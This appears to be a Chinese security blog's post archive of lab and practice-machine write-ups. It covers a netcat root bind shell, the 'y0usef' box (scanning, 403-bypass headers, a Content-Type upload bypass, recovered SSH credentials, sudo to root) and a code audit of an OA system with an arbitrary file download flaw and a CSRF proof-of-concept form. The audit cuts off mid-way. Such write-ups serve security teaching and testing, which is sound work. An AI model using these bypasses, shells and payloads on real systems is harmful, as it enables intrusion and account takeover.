<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">saket@ubuntu:~$ netstat -pantu | <span class="keyword">grep</span> <span class="number">5600</span></span><br><span class="line">netstat -pantu | <span class="keyword">grep</span> <span class="number">5600</span></span><br><span class="line">(Not <span class="keyword">all</span> processes could <span class="keyword">be</span> identified, non-owned process info</span><br><span class="line"> will not <span class="keyword">be</span> shown, you would have <span class="keyword">to</span> <span class="keyword">be</span> root <span class="keyword">to</span> see it <span class="keyword">all</span>.)</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">5600</span>            <span class="number">0.0</span>.<span class="number">0.0</span>:*               LISTEN      -</span><br></pre></td></tr></table></figure>

<p>现在通过kali连接该端口就行了</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# nc 172.16.42.207 5600</span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure>

<p>提权成功。</p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习8-y0usef</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A08-y0usef/</url>
    <content><![CDATA[<p>wahtweb指纹识别 | 403bypass | 文件上传绕过 | sudo提权</p>
<span id="more"></span>









<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="string">[root@kali ~]</span># sudo arp-scan -l</span><br><span class="line"></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: <span class="number">00</span>:0c:<span class="number">29</span>:<span class="number">03</span>:ac:<span class="number">71</span>, IPv4: <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">147</span></span><br><span class="line">Starting arp-scan <span class="number">1</span>.<span class="number">9</span>.<span class="number">7</span> with <span class="number">256</span> hosts (https://github.com/royhills/arp-scan)</span><br><span class="line"><span class="number">172.16.42.1</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:c0:<span class="number">00</span>:<span class="number">08</span>	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.2</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fd:8b:c9	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.208</span>	<span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:ff:4d:<span class="number">67</span>	PCS Systemtechnik GmbH</span><br><span class="line"><span class="number">172.16.42.254</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:e2:0c:<span class="number">93</span>	VMware, Inc.</span><br></pre></td></tr></table></figure>





<h3 id="nmap-版本及脚本扫描"><a href="#nmap-版本及脚本扫描" class="headerlink" title="nmap 版本及脚本扫描"></a>nmap 版本及脚本扫描</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@kali ~]</span># <span class="selector-tag">nmap</span> <span class="selector-tag">-p22</span>,<span class="selector-tag">80</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-sC</span> <span class="selector-tag">172</span><span class="selector-class">.16</span><span class="selector-class">.42</span><span class="selector-class">.208</span></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2022-11-20 20:37 EST</span></span><br><span class="line">Nmap scan report for <span class="number">172.16</span>.<span class="number">42.208</span></span><br><span class="line">Host is up (<span class="number">0.00060s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">6.6</span>.<span class="number">1</span>p1 Ubuntu <span class="number">2</span>ubuntu2.<span class="number">13</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="attribute">ssh-hostkey</span>:</span><br><span class="line">|   <span class="number">1024</span> <span class="attribute">d8</span>:<span class="attribute">e0</span>:<span class="number">99</span>:<span class="number">8</span><span class="attribute">c</span>:<span class="number">76</span>:<span class="attribute">f1</span>:<span class="number">86</span>:<span class="attribute">a3</span>:<span class="attribute">ce</span>:<span class="number">09</span>:<span class="attribute">c8</span>:<span class="number">19</span>:<span class="attribute">a4</span>:<span class="number">1</span><span class="attribute">d</span>:<span class="attribute">c7</span>:e1 (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">82</span>:<span class="attribute">b0</span>:<span class="number">20</span>:<span class="attribute">bc</span>:<span class="number">04</span>:<span class="attribute">ea</span>:<span class="number">3</span><span class="attribute">f</span>:<span class="attribute">c2</span>:<span class="attribute">cf</span>:<span class="number">73</span>:<span class="attribute">c3</span>:<span class="attribute">d4</span>:<span class="attribute">fa</span>:<span class="attribute">b5</span>:<span class="number">4</span><span class="attribute">b</span>:<span class="number">47</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">03</span>:<span class="number">4</span><span class="attribute">d</span>:<span class="attribute">b0</span>:<span class="number">70</span>:<span class="number">4</span><span class="attribute">d</span>:<span class="attribute">cf</span>:<span class="number">5</span><span class="attribute">a</span>:<span class="number">4</span><span class="attribute">a</span>:<span class="number">87</span>:<span class="attribute">c3</span>:<span class="attribute">a5</span>:<span class="attribute">ee</span>:<span class="number">84</span>:<span class="attribute">cc</span>:<span class="attribute">aa</span>:cc (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">64</span>:<span class="attribute">cd</span>:<span class="attribute">d0</span>:<span class="attribute">af</span>:<span class="number">6</span><span class="attribute">e</span>:<span class="number">0</span><span class="attribute">d</span>:<span class="number">20</span>:<span class="number">13</span>:<span class="number">01</span>:<span class="number">96</span>:<span class="number">3</span><span class="attribute">b</span>:<span class="number">8</span><span class="attribute">d</span>:<span class="number">16</span>:<span class="number">3</span><span class="attribute">a</span>:<span class="attribute">d6</span>:<span class="number">1</span>b (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">10</span> ((Ubuntu))</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">10</span> (Ubuntu)</span><br><span class="line">|<span class="attribute">_http-title</span>: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">MAC <span class="attribute">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="attribute">FF</span>:<span class="number">4</span><span class="attribute">D</span>:<span class="number">67</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">OS</span>: Linux; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">linux</span>:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">10.92</span> seconds</span><br></pre></td></tr></table></figure>





<h2 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h2><h3 id="whatweb指纹识别"><a href="#whatweb指纹识别" class="headerlink" title="whatweb指纹识别"></a>whatweb指纹识别</h3><figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line"><span class="comment">[root@kali ~]</span># whatweb http://172.16.42.208/</span><br><span class="line">http://172.16.42.208/ <span class="comment">[200 OK]</span> Apache<span class="comment">[2.4.10]</span>, Bootstrap, Country<span class="comment">[RESERVED]</span><span class="comment">[ZZ]</span>, HTTPServer<span class="comment">[Ubuntu Linux]</span><span class="comment">[Apache/2.4.10 (Ubuntu)]</span>, IP<span class="comment">[172.16.42.208]</span>, JQuery, PHP<span class="comment">[5.5.9-1ubuntu4.29]</span>, Script, X-Powered-By<span class="comment">[PHP/5.5.9-1ubuntu4.29]</span></span><br></pre></td></tr></table></figure>





<h3 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">apt install dirsearch</span><br><span class="line">dirsearch -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.208</span>/</span><br></pre></td></tr></table></figure>

<p>发现</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">[<span class="number">21</span>:<span class="number">01</span>:<span class="number">06</span>] <span class="number">301</span> -  <span class="number">322</span>B  - <span class="regexp">/adminstration  -&gt;  http:/</span><span class="regexp">/172.16.42.208/</span>adminstration/</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://172.16.42.208/adminstration/">http://172.16.42.208/adminstration/</a> </p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/30.jpg"></p>
<h3 id="403-bypass"><a href="#403-bypass" class="headerlink" title="403 bypass"></a>403 bypass</h3><p>常规三种403bypass方式：</p>
<ul>
<li><p><strong>主机名替换（旁站）</strong></p>
<p>搜集abc.com域下其他主机名 <code>$xxx$.abc.com</code></p>
</li>
<li><p><strong>url覆盖</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Request</span></span><br><span class="line"><span class="attribute">GET</span> /auth/login HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response</span></span><br><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">403</span> Forbidden</span><br></pre></td></tr></table></figure>

<p>替换</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Request</span></span><br><span class="line"><span class="attribute">GET</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">X</span>-Original-URL: /auth/login</span><br><span class="line"></span><br><span class="line"><span class="comment">#Response</span></span><br><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> OK</span><br></pre></td></tr></table></figure>

<p>一些可用的</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">X-Original-<span class="built_in">URL</span></span><br><span class="line">X-Rewrite-<span class="built_in">URL</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>ReFerer</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Request</span></span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line">ReFerer: https:<span class="regexp">//</span>xxx<span class="regexp">/auth/</span>login</span><br></pre></td></tr></table></figure></li>
<li><p><strong>多层网络架构</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.42.210</span><br><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure></li>
</ul>
<p>本次通过<code>X-Forwarded-For</code>绕过</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/31.jpg"></p>
<p>返回来一个登录页面用admin/admin进行登录。</p>
<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><p>通过修改content-type为图片绕过：<code>Content-Type: image/png</code></p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/32.jpg"></p>
<p>通过反弹的shell读取到</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(www-data:/home)</span> $ cat /home/user.txt</span><br><span class="line">c<span class="number">3</span><span class="symbol">NoIDogCnVzZXIgOiB5</span>b<span class="number">3</span>VzZWYgC<span class="symbol">nBhc3</span>MgOiB<span class="number">5</span>b<span class="number">3</span>VzZWYxMjM=</span><br></pre></td></tr></table></figure>



<p>base64解码</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">ssh : </span><br><span class="line"><span class="type">user</span> : <span class="type">yousef</span> </span><br><span class="line">pass : <span class="type">yousef123</span></span><br></pre></td></tr></table></figure>



<h2 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h2><p>使用上述账号密码登录</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">yousef<span class="variable">@yousef</span>-<span class="symbol">VirtualBox:</span>~<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">yousef:</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> yousef on yousef-<span class="symbol">VirtualBox:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line">User yousef may run the following commands on yousef-<span class="symbol">VirtualBox:</span></span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">yousef<span class="variable">@yousef</span>-<span class="symbol">VirtualBox:</span>~<span class="variable">$ </span>sudo su</span><br><span class="line">root<span class="variable">@yousef</span>-<span class="symbol">VirtualBox:</span>/home/yousef<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<p>查看flag</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">root@yousef-VirtualBox:<span class="regexp">/home/</span>yousef<span class="comment"># cd /root</span></span><br><span class="line">root@yousef-VirtualBox:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@yousef-VirtualBox:~<span class="comment"># cat root.txt</span></span><br><span class="line">WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span><br></pre></td></tr></table></figure>



<p>解码</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">You</span>&#x27;ve got the root Congratulations any feedback content me twitter @y<span class="number">0</span>usef_<span class="number">11</span></span><br></pre></td></tr></table></figure>









































]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>某OA系统代码审计</title>
    <url>/%E6%9F%90OA%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>主要框架是SpringBoot+Mybatis的<a href="https://github.com/misstt123/oasys">项目</a>，使用手工+CodeQL进行0day挖掘</p>
<span id="more"></span>



<h2 id="1-环境构建"><a href="#1-环境构建" class="headerlink" title="1. 环境构建"></a>1. 环境构建</h2><p>本地</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/misstt123/</span>oasys</span><br></pre></td></tr></table></figure>

<p>将sql脚本和资源文件复制到linux</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> oasys]$ scp oasys.sql vuln:/tmp</span><br><span class="line"></span><br><span class="line">[shadowflow<span class="meta">@ShadowOS</span> oasys]$ scp -r <span class="keyword">static</span> vuln:<span class="regexp">/root/</span>vuln/</span><br></pre></td></tr></table></figure>

<p>启动mysql容器，关于容器配置不再赘述，参考<a href="https://shadowfl0w.github.io/%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">文章</a></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> ~]<span class="meta"># docker start my-mysql</span></span><br></pre></td></tr></table></figure>

<p>将sql脚本复制到容器</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]# docker cp <span class="regexp">/tmp/</span>oasys.sql my-mysql:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>进入容器中的mysql</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># docker exec -it my-mysql bash</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@ebc3aac24bca</span><span class="symbol">:/</span><span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter <span class="symbol">password:</span></span><br></pre></td></tr></table></figure>

<p>创建数据库，加载脚本</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">create</span> <span class="keyword">database</span> oasys;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="keyword">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use oasys;</span><br><span class="line"><span class="keyword">Database</span> changed</span><br><span class="line"></span><br><span class="line">mysql&gt; source /root/oasys.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure>

<p>由于项目默认mysql是5版本，我们部署的mysql容器是8版本以上，所以需要稍加修改</p>
<p>添加maven配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>springboot配置文件修改</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改驱动</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=com.mysql.cj.jdbc.Driver</span><br><span class="line"><span class="comment">#修改账号密码</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=root</span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p>修改资源文件路径</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>.root.path=<span class="regexp">/root/</span>vuln<span class="regexp">/static/</span><span class="keyword">file</span></span><br><span class="line">img.rootpath=<span class="regexp">/root/</span>vuln<span class="regexp">/static/im</span>ages</span><br><span class="line">attachment.roopath=<span class="regexp">/root/</span>vuln<span class="regexp">/static/</span>attachment</span><br></pre></td></tr></table></figure>

<p>idea远程部署直接运行就好了。</p>
<h2 id="2-CodeQL分析"><a href="#2-CodeQL分析" class="headerlink" title="2. CodeQL分析"></a>2. CodeQL分析</h2><p>CodeQL的扫描不再赘述，扫描结果发现6类安全问题，逐一分析</p>
<p><strong>java/untrusted-data-to-external-api</strong></p>
<p>扫描到api接口暴露，并且未做权限验证，我们看一下</p>
<p>看一下查询代码</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle<span class="selector-class">.code</span><span class="selector-class">.java</span><span class="selector-class">.dataflow</span><span class="selector-class">.FlowSources</span></span><br><span class="line">import semmle<span class="selector-class">.code</span><span class="selector-class">.java</span><span class="selector-class">.dataflow</span><span class="selector-class">.TaintTracking</span></span><br><span class="line">import semmle<span class="selector-class">.code</span><span class="selector-class">.java</span><span class="selector-class">.security</span><span class="selector-class">.ExternalAPIs</span></span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">from UntrustedDataToExternalAPIConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config<span class="selector-class">.hasFlowPath</span>(source, sink)</span><br><span class="line">select sink, source, sink,</span><br><span class="line">  <span class="string">&quot;Call to &quot;</span> + sink<span class="selector-class">.getNode</span>().(ExternalAPIDataNode)<span class="selector-class">.getMethodDescription</span>() +</span><br><span class="line">    <span class="string">&quot; with untrusted data from $@.&quot;</span>, source, source<span class="selector-class">.toString</span>()</span><br></pre></td></tr></table></figure>

<p>UntrustedDataToExternalAPIConfig是标准库里的一个类，表示传递给外部API的数据的节点。</p>
<p>如下图看第一个结果是没有安全风险的，只是将外部数据给打印出来。</p>
<p><img src="../images/pics/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/31.jpg"></p>
<p>这个查询代码我们可以发现越权问题，比如我们找一些未做权限校验的敏感信息访问页面或者高危操作。比如文件下载未做权限校验，可以下载任意用户的文件</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="operator"> * </span>@param fileid</span><br><span class="line"> */</span><br><span class="line">@<span class="constructor">RequestMapping(<span class="string">&quot;file&quot;</span>)</span></span><br><span class="line">public void down<span class="constructor">File(HttpServletResponse <span class="params">response</span>, @RequestParam(<span class="string">&quot;fileid&quot;</span>)</span> Long fileid) &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		Attachment attd = <span class="module-access"><span class="module"><span class="identifier">AttDao</span>.</span></span>find<span class="constructor">One(<span class="params">fileid</span>)</span>;</span><br><span class="line">		File file = <span class="keyword">new</span> <span class="constructor">File(<span class="params">rootpath</span>,<span class="params">attd</span>.<span class="params">getAttachmentPath</span>()</span>);</span><br><span class="line">		response.set<span class="constructor">ContentLength(<span class="params">attd</span>.<span class="params">getAttachmentSize</span>()</span>.<span class="built_in">int</span><span class="constructor">Value()</span>);</span><br><span class="line">		response.set<span class="constructor">ContentType(<span class="params">attd</span>.<span class="params">getAttachmentType</span>()</span>);</span><br><span class="line">		response.set<span class="constructor">Header(<span class="string">&quot;Content-Disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span> + <span class="params">new</span> String(<span class="params">attd</span>.<span class="params">getAttachmentName</span>()</span>.get<span class="constructor">Bytes(<span class="string">&quot;UTF-8&quot;</span>)</span>, <span class="string">&quot;ISO8859-1&quot;</span>));</span><br><span class="line">		proservice.writefile(response, file);</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>java/count-untrusted-data-external-api</strong></p>
<p>统计API</p>
<p><strong>java/mybatis-xml-sql-injection</strong></p>
<p>是Mybatis的sql注入检查，sql注入有很多，具体利用参考<a href="https://shadowfl0w.github.io/%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">上篇文章</a></p>
<p><strong>java/log-injection</strong></p>
<p>日志的污点传播，不过多分析，当然在传播过程也可能出现危险操作风险</p>
<p><strong>java/hardcoded-credential-sensitive-call</strong></p>
<p>硬编码安全问题，两个弱口令</p>
<p><img src="../images/pics/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/32.jpg"> </p>
<h2 id="3-XSS"><a href="#3-XSS" class="headerlink" title="3. XSS"></a>3. XSS</h2><p>xss随处可见</p>
<p><img src="../images/pics/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/25.jpg"></p>
<h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4. CSRF"></a>4. CSRF</h2><p>测试一下写便签的csrf，抓到如下包</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /writep HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">172.16.42.151</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>.<span class="number">15</span>; rv:<span class="number">97</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">97</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">32</span></span><br><span class="line"><span class="attribute">Origin</span>: http://<span class="number">172.16.42.151</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">172.16.42.151</span>/userpanel</span><br><span class="line"><span class="attribute">Cookie</span>: csrftoken=i<span class="number">1</span>qmoC<span class="number">5</span>LpcStYF<span class="number">7</span>s<span class="number">0</span>pd<span class="number">0</span>T<span class="number">8</span>i<span class="number">4</span>IytR<span class="number">6</span>EmmRbiJplVsydqhWb<span class="number">7</span>h<span class="number">8</span>Ru<span class="number">5</span>xl<span class="number">879</span>WPPU<span class="number">7</span>Xr; io=<span class="number">1</span>ZhdDaE<span class="number">0</span>vYHbIFLrAAAM; JSESSIONID=<span class="number">6</span>F<span class="number">29</span>C<span class="number">07</span>D<span class="number">974</span>E<span class="number">6</span>F<span class="number">59</span>C<span class="number">5</span>CD<span class="number">22</span>B<span class="number">7630</span>FC<span class="number">55</span>B; remember-me=YWRtaW<span class="number">46</span>MTY<span class="number">0</span>ODAyNDQxNDMzOTo<span class="number">1</span>YzY<span class="number">4</span>ZDIyOGUxY<span class="number">2</span>ZjMDIzZmQ<span class="number">5</span>YWVkOTYyOGZlNGUwYQ</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">notepaperId</span>=&amp;title=bb&amp;concent=bb</span><br></pre></td></tr></table></figure>

<p>修改<code>title</code>和<code>concent</code>参数，看是否可以完成csrf。</p>
<p>用burp生成poc</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://172.16.42.151/writep&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;notepaperId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ccc&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;concent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ccc&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用同一个浏览器，发现成功写入。</p>
<h2 id="5-XSS-CSRF"><a href="#5-XSS-CSRF" class="headerlink" title="5. XSS + CSRF"></a>5. XSS + CSRF</h2><p>上诉CSRF漏洞也存在XSS漏洞，但是这是POST型XSS，很难利用，如果结合CSRF，我们不仅能进行插入标签，还能盗取cookie等其他js脚本可以劫持的操作。</p>
<p>我们将poc改成获取弹出cookie</p>
